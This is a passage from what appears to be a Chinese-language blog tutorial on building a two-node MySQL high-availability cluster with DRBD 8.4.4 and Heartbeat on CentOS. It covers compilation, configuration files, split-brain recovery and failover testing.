UUID=00f120ec:bab2f3fe:80d88cb9:3ee4b76b</div><div class="line">devices /dev/md0 /dev/md1</div></pre></td></tr></table></figure>
<h2 id="安装DRBD"><a href="#安装DRBD" class="headerlink" title="安装DRBD"></a>安装DRBD</h2><h3 id="1-解压并安装DRBD"><a href="#1-解压并安装DRBD" class="headerlink" title="1.解压并安装DRBD"></a>1.解压并安装DRBD</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[root@master Linux]<span class="comment"># yum -y install gcc kernel-devel kernel-headers flex perl</span></div><div class="line">[root@master Linux]<span class="comment"># http://oss.linbit.com/drbd/8.4/drbd-8.4.4.tar.gz</span></div><div class="line">[root@master Linux]<span class="comment"># tar fzvx drbd-8.4.4.tar.gz</span></div><div class="line">[root@master Linux]<span class="comment"># cd drbd-8.4.4</span></div><div class="line">[root@master drbd-8.4.4]<span class="comment"># ./configure --prefix=/usr/local/drbd-8.4 --with-km</span></div><div class="line">[root@master drbd-8.4.4]<span class="comment"># make KDIR=/usr/src/kernels/2.6.32-358.el6.x86_64/</span></div><div class="line">[root@master drbd-8.4.4]<span class="comment"># make install</span></div><div class="line">[root@master drbd-8.4.4<span class="comment"># mkdir -p /usr/local/drbd-8.4/var/run/drbd</span></div><div class="line">[root@master drbd-8.4.4]<span class="comment"># cp /usr/local/drbd-8.4/etc/rc.d/init.d/drbd /etc/init.d/</span></div><div class="line">[root@master drbd-8.4.4]<span class="comment"># chkconfig --add drbd</span></div><div class="line">[root@master drbd-8.4.4]<span class="comment"># chkconfig drbd on</span></div></pre></td></tr></table></figure>
<h3 id="2-安装drbd模块"><a href="#2-安装drbd模块" class="headerlink" title="2.安装drbd模块"></a>2.安装drbd模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@master drbd-8.4.4]<span class="comment"># cd drbd</span></div><div class="line">[root@master drbd]<span class="comment"># make clean</span></div><div class="line">[root@master drbd]<span class="comment"># make KDIR=/usr/src/kernels/2.6.32-358.el6.x86_64/</span></div><div class="line">[root@master drbd]<span class="comment"># cp drbd.ko /lib/modules/2.6.32-358.el6.x86_64/kernel/lib/</span></div><div class="line">[root@master drbd]<span class="comment"># depmod</span></div></pre></td></tr></table></figure>
<h3 id="3-配置global-common-conf"><a href="#3-配置global-common-conf" class="headerlink" title="3.配置global_common.conf"></a>3.配置global_common.conf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">[root@master drbd]<span class="comment"># cd /usr/local/drbd-8.4/etc/drbd.d/</span></div><div class="line">[root@master drbd.d]<span class="comment"># cp global_common.conf global_common.conf.bak</span></div><div class="line">[root@master drbd.d]<span class="comment"># vi global_common.conf</span></div><div class="line">global &#123;</div><div class="line">usage-count no;</div><div class="line">&#125;</div><div class="line">common &#123;</div><div class="line">handlers &#123;</div><div class="line">pri-on-incon-degr <span class="string">"/usr/lib/drbd/notify-pri-on-incon-degr.sh; /usr/lib/drbd/notify-emergency-reboot.sh; echo b &gt; /proc/sysrq-trigger ; reboot -f"</span>;</div><div class="line">pri-lost-after-sb <span class="string">"/usr/lib/drbd/notify-pri-lost-after-sb.sh; /usr/lib/drbd/notify-emergency-reboot.sh; echo b &gt; /proc/sysrq-trigger ; reboot -f"</span>;</div><div class="line"><span class="built_in">local</span>-io-error <span class="string">"/usr/lib/drbd/notify-io-error.sh; /usr/lib/drbd/notify-emergency-shutdown.sh; echo o &gt; /proc/sysrq-trigger ; halt -f"</span>;</div><div class="line">fence-peer <span class="string">"/usr/lib/drbd/crm-fence-peer.sh"</span>;</div><div class="line">split-brain <span class="string">"/usr/lib/drbd/notify-split-brain.sh root"</span>;</div><div class="line">out-of-sync <span class="string">"/usr/lib/drbd/notify-out-of-sync.sh root"</span>;</div><div class="line">&#125;</div><div class="line">startup &#123;</div><div class="line">wfc-timeout 30;</div><div class="line">degr-wfc-timeout 30;</div><div class="line">outdated-wfc-timeout 30;</div><div class="line">&#125;</div><div class="line">disk &#123;</div><div class="line"><span class="comment">#磁盘读写速度与同步速率的30%</span></div><div class="line">resync-rate 30M;</div><div class="line">on-io-error detach;</div><div class="line">fencing resource-only;</div><div class="line">&#125;</div><div class="line">net &#123;</div><div class="line">protocol C;</div><div class="line">cram-hmac-alg sha1;</div><div class="line">shared-secret <span class="string">"mysql-ha"</span>;</div><div class="line">csums-alg sha1;</div><div class="line">verify-alg crc32c;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="4-创建r0资源"><a href="#4-创建r0资源" class="headerlink" title="4.创建r0资源"></a>4.创建r0资源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[root@master drbd.d]<span class="comment"># vi r0.res</span></div><div class="line">resource r0&#123;</div><div class="line"> on master&#123;</div><div class="line"> device /dev/drbd0; <span class="comment">#逻辑设备的路径</span></div><div class="line"> disk /dev/md2; <span class="comment">#物理设备</span></div><div class="line"> address  192.168.2.10:7788;</div><div class="line"> meta-disk  internal;</div><div class="line"> &#125;</div><div class="line"> on slave&#123;</div><div class="line"> device /dev/drbd0;</div><div class="line"> disk /dev/md2;</div><div class="line"> address  192.168.2.11:7788;</div><div class="line"> meta-disk  internal;</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="5-建立-drbd-resource"><a href="#5-建立-drbd-resource" class="headerlink" title="5.建立 drbd resource"></a>5.建立 drbd resource</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@master drbd.d]<span class="comment"># modprobe drbd</span></div><div class="line">[root@master drbd.d]<span class="comment"># drbdadm create-md r0</span></div><div class="line">[root@master drbd.d]<span class="comment"># drbdadm up r0</span></div></pre></td></tr></table></figure>
<h3 id="6-设置Primary-在master节点操作"><a href="#6-设置Primary-在master节点操作" class="headerlink" title="6.设置Primary [在master节点操作]"></a>6.设置Primary [在master节点操作]</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@master drbd.d]<span class="comment"># drbdadm primary --force r0</span></div></pre></td></tr></table></figure>
<h3 id="7-创建DRBD文件系统-在Mysql主节点的master上执行"><a href="#7-创建DRBD文件系统-在Mysql主节点的master上执行" class="headerlink" title="7.创建DRBD文件系统 [在Mysql主节点的master上执行]"></a>7.创建DRBD文件系统 [在Mysql主节点的master上执行]</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@master drbd.d]<span class="comment"># mkfs.ext4 /dev/drbd0</span></div><div class="line">[root@master drbd.d]<span class="comment"># mount /dev/drbd0 /raid10/</span></div></pre></td></tr></table></figure>
<h3 id="8-DRBD同步测试"><a href="#8-DRBD同步测试" class="headerlink" title="8.DRBD同步测试"></a>8.DRBD同步测试</h3><h4 id="首先，在主服务器上先将设备卸载，同时将主服务器降为备用服务器："><a href="#首先，在主服务器上先将设备卸载，同时将主服务器降为备用服务器：" class="headerlink" title="首先，在主服务器上先将设备卸载，同时将主服务器降为备用服务器："></a>首先，在主服务器上先将设备卸载，同时将主服务器降为备用服务器：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@master drbd]<span class="comment"># mkdir -p /raid10/mysql/data</span></div><div class="line">[root@master drbd]<span class="comment"># cd /</span></div><div class="line">[root@master /]<span class="comment"># umount /dev/drbd0</span></div><div class="line">[root@master /]<span class="comment"># drbdadm secondary r0</span></div></pre></td></tr></table></figure>
<h4 id="然后，登录备用服务器，将备用服务器升为主服务器，同时挂载drbd0设备到-raid10目录："><a href="#然后，登录备用服务器，将备用服务器升为主服务器，同时挂载drbd0设备到-raid10目录：" class="headerlink" title="然后，登录备用服务器，将备用服务器升为主服务器，同时挂载drbd0设备到 /raid10目录："></a>然后，登录备用服务器，将备用服务器升为主服务器，同时挂载drbd0设备到 /raid10目录：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@slave drbd]<span class="comment"># drbdadm up r0</span></div><div class="line">[root@slave drbd]<span class="comment"># drbdadm primary r0</span></div><div class="line">[root@slave drbd]<span class="comment"># mount /dev/drbd0 /raid10/</span></div><div class="line">[root@slave drbd]<span class="comment"># cd /raid10/</span></div><div class="line">[root@slave raid10]<span class="comment"># ls</span></div><div class="line">lost+found mysql</div></pre></td></tr></table></figure>
<h2 id="使用中出现脑裂以及解决办法"><a href="#使用中出现脑裂以及解决办法" class="headerlink" title="使用中出现脑裂以及解决办法"></a>使用中出现脑裂以及解决办法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@slave ~]<span class="comment"># cat /proc/drbd</span></div><div class="line">version: 8.4.4 (api:1/proto:86-101)</div><div class="line">GIT-hash: 599f286440bd633d15d5ff985204aff4bccffadd build by root@slave, 2013-12-03 09:50:30 0: cs:StandAlone ro:Primary/Unknown ds:UpToDate/Outdated r-----</div><div class="line">ns:0 nr:0 dw:2 dr:1684 al:1 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:4</div></pre></td></tr></table></figure>
<h3 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[root@slave /]<span class="comment"># tail -f /var/log/messages</span></div><div class="line">Dec  3 11:06:05 slave kernel: block drbd0: helper <span class="built_in">command</span>: /sbin/drbdadm split-brain minor-0 <span class="built_in">exit</span> code</div><div class="line">127 (0x7f00)</div><div class="line">Dec  3 11:06:05 slave kernel: drbd r0: conn( WFReportParams -&gt; Disconnecting )</div><div class="line">Dec  3 11:06:05 slave kernel: drbd r0: error receiving ReportState, e: -5 l: 0!</div><div class="line">Dec  3 11:06:05 slave kernel: drbd r0: asender terminated</div><div class="line">Dec  3 11:06:05 slave kernel: drbd r0: Terminating drbd_a_r0</div><div class="line">Dec  3 11:06:05 slave kernel: drbd r0: Connection closed</div><div class="line">Dec  3 11:06:05 slave kernel: drbd r0: conn( Disconnecting -&gt; StandAlone )</div><div class="line">Dec  3 11:06:05 slave kernel: drbd r0: receiver terminated</div><div class="line">Dec  3 11:06:05 slave kernel: drbd r0: Terminating drbd_r_r0</div><div class="line">Dec  3 11:06:41 slave kernel: block drbd0: role( Secondary -&gt; Primary )</div></pre></td></tr></table></figure>
<h2 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h2><h3 id="1-需要将现在的master角色修改为secondary"><a href="#1-需要将现在的master角色修改为secondary" class="headerlink" title="1.需要将现在的master角色修改为secondary"></a>1.需要将现在的master角色修改为secondary</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@master ~]<span class="comment"># drbdadm secondary r0</span></div><div class="line"><span class="comment">#该命令告诉slave，secondary上的数据不正确，以primary上的数据为准。</span></div><div class="line">[root@master ~]<span class="comment"># drbdadm -- --discard-my-data connect r0</span></div></pre></td></tr></table></figure>
<h3 id="2-我们还需要在slave上执行下面操作"><a href="#2-我们还需要在slave上执行下面操作" class="headerlink" title="2.我们还需要在slave上执行下面操作"></a>2.我们还需要在slave上执行下面操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#这样master就能和slave开始连接上了，并且保证数据不会丢失：</span></div><div class="line">[root@slave ~]<span class="comment"># drbdadm connect r0</span></div><div class="line">[root@slave ~]<span class="comment"># cat /proc/drbd</span></div><div class="line">version: 8.4.4 (api:1/proto:86-101)</div><div class="line">GIT-hash: 599f286440bd633d15d5ff985204aff4bccffadd build by root@slave, 2013-12-03 09:50:30</div><div class="line"> 0: cs:Connected ro:Secondary/Primary ds:UpToDate/UpToDate C r-----</div><div class="line"> ns:0 nr:4 dw:6 dr:1688 al:1 bm:1 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</div><div class="line">[root@master ~]<span class="comment"># cat /proc/drbd</span></div><div class="line">version: 8.4.4 (api:1/proto:86-101)</div><div class="line">GIT-hash: 599f286440bd633d15d5ff985204aff4bccffadd build by root@master, 2013-12-03 09:49:22</div><div class="line"> 0: cs:Connected ro:Primary/Secondary ds:UpToDate/UpToDate C r-----</div><div class="line"> ns:4 nr:0 dw:1 dr:1015 al:1 bm:1 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</div></pre></td></tr></table></figure>
<h2 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h2><h3 id="1-mastr节点"><a href="#1-mastr节点" class="headerlink" title="1.mastr节点"></a>1.mastr节点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">[root@master Linux]<span class="comment"># yum install gcc gcc-c++ autoconf automake ncurses-devel libtool-ltdl-devel* -y</span></div><div class="line">[root@master Linux]<span class="comment"># useradd -M -s /sbin/nologin mysql</span></div><div class="line">[root@master Linux]<span class="comment"># tar zfvx cmake-2.8.12.tar.gz</span></div><div class="line">[root@master Linux]<span class="comment"># cd cmake-2.8.12</span></div><div class="line">[root@master cmake-2.8.12]<span class="comment"># ./configure</span></div><div class="line">[root@master cmake-2.8.12]<span class="comment"># gmake &amp;&amp; make install</span></div><div class="line">[root@master cmake-2.8.12]<span class="comment"># cd ..</span></div><div class="line">[root@master Linux]<span class="comment"># tar zfxv mysql-5.5.25.tar.gz</span></div><div class="line">[root@master Linux]<span class="comment"># cd mysql-5.5.25</span></div><div class="line">[root@master mysql-5.5.25]<span class="comment"># cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql-5.5</span></div><div class="line">[root@master mysql-5.5.25]<span class="comment"># make &amp;&amp; make install</span></div><div class="line">[root@master mysql-5.5.25]<span class="comment"># cp support-files/my-medium.cnf /raid10/mysql/my.cf</span></div><div class="line">[root@master mysql-5.5.25]<span class="comment"># rm -rf /etc/my.cnf</span></div><div class="line">[root@master mysql-5.5.25]<span class="comment"># ln -sv /raid10/mysql/my.cf /etc/</span></div><div class="line">[root@master mysql-5.5.25]<span class="comment"># cd /usr/local/mysql-5.5/</span></div><div class="line">[root@master mysql-5.5]<span class="comment"># chown -R root:mysql .</span></div><div class="line">[root@master mysql-5.5]<span class="comment"># chown -R mysql:mysql /raid10/mysql/data/</span></div><div class="line">[root@master mysql-5.5]<span class="comment"># ./scripts/mysql_install_db --user=mysql \</span></div><div class="line">--basedir=/usr/<span class="built_in">local</span>/mysql-5.5/ \</div><div class="line">--datadir=/raid10/mysql/data/</div><div class="line">[root@master mysql-5.5]<span class="comment"># cp support-files/mysql.server /etc/init.d/mysqld</span></div><div class="line">[root@master mysql-5.5]<span class="comment"># chmod +x /etc/init.d/mysqld</span></div><div class="line">[root@master mysql-5.5]<span class="comment"># chkconfig --add mysqld</span></div><div class="line">[root@master mysql-5.5]<span class="comment"># vi /etc/init.d/mysqld</span></div><div class="line">datadir=/raid10/mysql/data</div></pre></td></tr></table></figure>
<h3 id="2-savle节点安装"><a href="#2-savle节点安装" class="headerlink" title="2.savle节点安装"></a>2.savle节点安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">——安装mysql[MySQL主节点的savle节点安装]</div><div class="line">[root@slave Linux]<span class="comment"># yum install gcc gcc-c++ autoconf automake ncurses-devel libtool-ltdl-devel* -y</span></div><div class="line">[root@slaveLinux]<span class="comment"># useradd -M -s /sbin/nologin mysql</span></div><div class="line">[root@slave Linux]<span class="comment"># tar zfvx cmake-2.8.12.tar.gz</span></div><div class="line">[root@slave Linux]<span class="comment"># cd cmake-2.8.12</span></div><div class="line">[root@slavecmake-2.8.12]<span class="comment"># ./configure</span></div><div class="line">[root@slavecmake-2.8.12]<span class="comment"># gmake &amp;&amp; make install</span></div><div class="line">[root@slavecmake-2.8.12]<span class="comment"># cd ..</span></div><div class="line">[root@slave Linux]<span class="comment"># tar zfxv mysql-5.5.25.tar.gz</span></div><div class="line">[root@slave Linux]<span class="comment"># cd mysql-5.5.25</span></div><div class="line">[root@slave mysql-5.5.25]<span class="comment"># cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql-5.5</span></div><div class="line">[root@slave mysql-5.5.25]<span class="comment"># make &amp;&amp; make install</span></div><div class="line">[root@slave mysql-5.5.25]<span class="comment"># cd /usr/local/mysql-5.5/</span></div><div class="line">[root@slave mysql-5.5]<span class="comment"># chown -R root:mysql .</span></div><div class="line">[root@slave mysql-5.5]<span class="comment"># cp support-files/mysql.server /etc/init.d/mysqld</span></div><div class="line">[root@slave mysql-5.5]<span class="comment"># vi /etc/init.d/mysqld</span></div><div class="line">datadir=/raid10/mysql/data</div></pre></td></tr></table></figure>
<h2 id="MySQL主节点实现高可用"><a href="#MySQL主节点实现高可用" class="headerlink" title="MySQL主节点实现高可用"></a>MySQL主节点实现高可用</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：以下操作在MySQL主节点的master、slave节点执行</p>
<h3 id="1-添加hosts主机信息"><a href="#1-添加hosts主机信息" class="headerlink" title="1.添加hosts主机信息"></a>1.添加hosts主机信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@master Linux]<span class="comment"># vi /etc/hosts</span></div><div class="line">192.168.2.10  master</div><div class="line">192.168.2.11  slave</div></pre></td></tr></table></figure>
<h3 id="2-添加用户和组"><a href="#2-添加用户和组" class="headerlink" title="2.添加用户和组"></a>2.添加用户和组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@master Linux]<span class="comment"># groupadd haclient</span></div><div class="line">[root@master Linux]<span class="comment"># useradd -g haclient -M -s /sbin/nologin hacluster</span></div></pre></td></tr></table></figure>
<h3 id="3-安装heartbeat"><a href="#3-安装heartbeat" class="headerlink" title="3.安装heartbeat"></a>3.安装heartbeat</h3><h4 id="安装相关软件依赖包"><a href="#安装相关软件依赖包" class="headerlink" title="安装相关软件依赖包"></a>安装相关软件依赖包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@master Linux]<span class="comment"># yum install libtool automake autoconf \</span></div><div class="line">glib2-devel \</div><div class="line">libxml2-devel \</div><div class="line">bzip2-devel \</div><div class="line">libtool-ltdl-devel \</div><div class="line">libxslt-devel \</div><div class="line">docbook* -y</div></pre></td></tr></table></figure>
<h4 id="安装glue"><a href="#安装glue" class="headerlink" title="安装glue"></a>安装glue</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@master Linux]<span class="comment"># wget http://hg.linux-ha.org/glue/archive/glue-1.0.9.tar.bz2</span></div><div class="line">[root@master Linux]<span class="comment"># tar jfvx glue-1.0.9.tar.bz2</span></div><div class="line">[root@master Linux]<span class="comment"># cd Reusable-Cluster-Components-glue--glue-1.0.9/</span></div><div class="line">[root@master Reusable-Cluster-Components-glue--glue-1.0.9]<span class="comment"># ./autogen.sh</span></div><div class="line">[root@master Reusable-Cluster-Components-glue--glue-1.0.9]<span class="comment"># ./configure LIBS='/lib64/libuuid.so.1'</span></div><div class="line">[root@CentOS Reusable-Cluster-Components-glue--glue-1.0.9]<span class="comment"># make &amp;&amp; make install</span></div></pre></td></tr></table></figure>
<h4 id="安装agents"><a href="#安装agents" class="headerlink" title="安装agents"></a>安装agents</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@master Heartbeat-3-0-7e3a82377fa8]<span class="comment"># cd ..</span></div><div class="line">[root@master Linux]<span class="comment"># wget https://codeload.github.com/ClusterLabs/resource-agents/legacy.tar.gz/v3.9.2</span></div><div class="line">[root@master Linux]<span class="comment"># tar zfvx ClusterLabs-resource-agents-v3.9.2-0-ge261943.tar.gz</span></div><div class="line">[root@master Linux]<span class="comment"># cd ClusterLabs-resource-agents-b735277/</span></div><div class="line">[root@master ClusterLabs-resource-agents-b735277]<span class="comment"># ./autogen.sh</span></div><div class="line">[root@master ClusterLabs-resource-agents-b735277]<span class="comment"># ./configure LIBS='/lib64/libuuid.so.1'</span></div><div class="line">[root@master ClusterLabs-resource-agents-b735277]<span class="comment"># make &amp;&amp; make install</span></div></pre></td></tr></table></figure>
<h4 id="安装heartbeat"><a href="#安装heartbeat" class="headerlink" title="安装heartbeat"></a>安装heartbeat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@master ClusterLabs-resource-agents-b735277]<span class="comment"># cd ..</span></div><div class="line">[root@master Linux]<span class="comment"># wget http://hg.linux-ha.org/heartbeat-STABLE_3_0/archive/7e3a82377fa8.tar.bz2</span></div><div class="line">[root@master Linux]<span class="comment"># tar jfvx heartbeat-3.0.5.tar.bz2</span></div><div class="line">[root@master Linux]<span class="comment"># cd Heartbeat-3-0-7e3a82377fa8/</span></div><div class="line">[root@master Heartbeat-3-0-7e3a82377fa8]<span class="comment"># ./bootstrap</span></div><div class="line">[root@master Heartbeat-3-0-7e3a82377fa8]<span class="comment"># ./ConfigureMe configure LIBS='/lib64/libuuid.so.1'</span></div><div class="line">[root@master Heartbeat-3-0-7e3a82377fa8]<span class="comment"># make &amp;&amp; make install</span></div></pre></td></tr></table></figure>
<h3 id="4-配置heartbeat"><a href="#4-配置heartbeat" class="headerlink" title="4.配置heartbeat"></a>4.配置heartbeat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">[root@master Heartbeat-3-0-7e3a82377fa8]<span class="comment"># cd doc</span></div><div class="line">[root@master doc]<span class="comment"># cp authkeys haresources ha.cf /etc/ha.d/</span></div><div class="line">[root@master doc]<span class="comment"># cp /usr/etc/ha.d/shellfuncs /etc/ha.d/</span></div><div class="line">[root@master doc]<span class="comment"># rm -rf /usr/etc/ha.d</span></div><div class="line">[root@master doc]<span class="comment"># ln -sv /etc/ha.d /usr/etc</span></div><div class="line">[root@master doc]<span class="comment"># vi /etc/ha.d/ha.cf</span></div><div class="line"><span class="comment">#开启日志</span></div><div class="line">logfile /var/<span class="built_in">log</span>/ha-log</div><div class="line"><span class="comment">#设置syslog()/logger设备</span></div><div class="line">logfacility local0</div><div class="line"><span class="comment">#心跳发送时间间隔/秒</span></div><div class="line">keepalive 2</div><div class="line"><span class="comment">#15秒没有收到主机心跳、确认主机故障</span></div><div class="line">deadtime 15</div><div class="line"><span class="comment">#警告次数</span></div><div class="line">warntime 5</div><div class="line"><span class="comment">#守护进程启动30后 启动服务资源</span></div><div class="line">initdead 30</div><div class="line"><span class="comment">#监听端口</span></div><div class="line">udpport 694</div><div class="line"><span class="comment">#另一个节点IP、通过检测来保证心跳的可用性</span></div><div class="line">ucast eth0 192.168.1.11</div><div class="line">ucast eth1 192.168.2.11</div><div class="line"><span class="comment">#两个节点的名字 [uname -n 获取]</span></div><div class="line">node master</div><div class="line">node slave</div><div class="line"><span class="comment">#开启DPOD</span></div><div class="line">respawn hacluster /usr/lib64/heartbeat/ipfail</div><div class="line">respawn hacluster /usr/lib64/heartbeat/dopd</div><div class="line">apiauth ipfail gid=haclient uid=hacluster</div><div class="line">apiauth dopd gid=haclient uid=hacluster</div><div class="line">[root@master doc]<span class="comment"># vi /etc/ha.d/authkeys</span></div><div class="line">auth 1</div><div class="line">1 sha1 HI!</div><div class="line">[root@master doc]<span class="comment"># chmod 600 /etc/ha.d/authkeys</span></div><div class="line">[root@master doc]<span class="comment"># vi /etc/ha.d/haresources</span></div><div class="line">master drbddisk::r0 Filesystem::/dev/drbd0::/raid10::ext4 mysqld IPaddr::192.168.1.254/24/eth0</div><div class="line">[root@master doc]<span class="comment"># cd /Linux/drbd-8.4.4/scripts/</span></div><div class="line">[root@master scripts]<span class="comment"># cp drbddisk /etc/ha.d/resource.d/</span></div><div class="line">[root@master scripts]<span class="comment"># cp /etc/init.d/mysqld /etc/ha.d/resource.d/</span></div><div class="line">[root@master scripts]<span class="comment"># chkconfig --add heartbeat</span></div><div class="line">[root@master scripts]<span class="comment"># chkconfig heartbeat on</span></div></pre></td></tr></table></figure>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="1-启动master节点启动heartbeat"><a href="#1-启动master节点启动heartbeat" class="headerlink" title="1.启动master节点启动heartbeat"></a>1.启动master节点启动heartbeat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@master scripts]<span class="comment"># /etc/init.d/heartbeat start</span></div></pre></td></tr></table></figure>
<h3 id="2-启动slave节点启动heartbeat"><a href="#2-启动slave节点启动heartbeat" class="headerlink" title="2.启动slave节点启动heartbeat"></a>2.启动slave节点启动heartbeat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@slave scripts]<span class="comment"># /etc/init.d/heartbeat start</span></div></pre></td></tr></table></figure>
